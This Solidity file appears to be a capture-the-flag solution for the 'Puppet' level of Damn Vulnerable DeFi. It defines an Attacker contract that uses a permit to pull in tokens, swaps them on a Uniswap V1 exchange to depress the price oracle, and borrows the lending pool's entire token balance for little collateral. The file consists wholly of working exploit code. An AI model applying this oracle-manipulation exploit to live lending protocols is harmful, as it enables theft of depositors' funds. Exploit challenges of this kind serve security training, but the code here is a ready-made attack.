// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attacker {
    constructor(IUniswapV1Exchange uniswapV1Exchange, PuppetPool lendingPool, DamnValuableToken token, uint8 v, bytes32 r, bytes32 s, address recovery) payable {
        console.log(address(this));
        token.permit(msg.sender, address(this), 1000e18, block.timestamp, v, r, s);
        token.transferFrom(msg.sender, address(this), 1000e18);
        console.log(token.balanceOf(address(this)));
        token.approve(address(uniswapV1Exchange), 1000e18);
        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 1, block.timestamp);
        lendingPool.borrow{value:20 ether}(100_000e18, recovery);    
    }
    
    receive() external payable {}
    fallback() external payable {}
}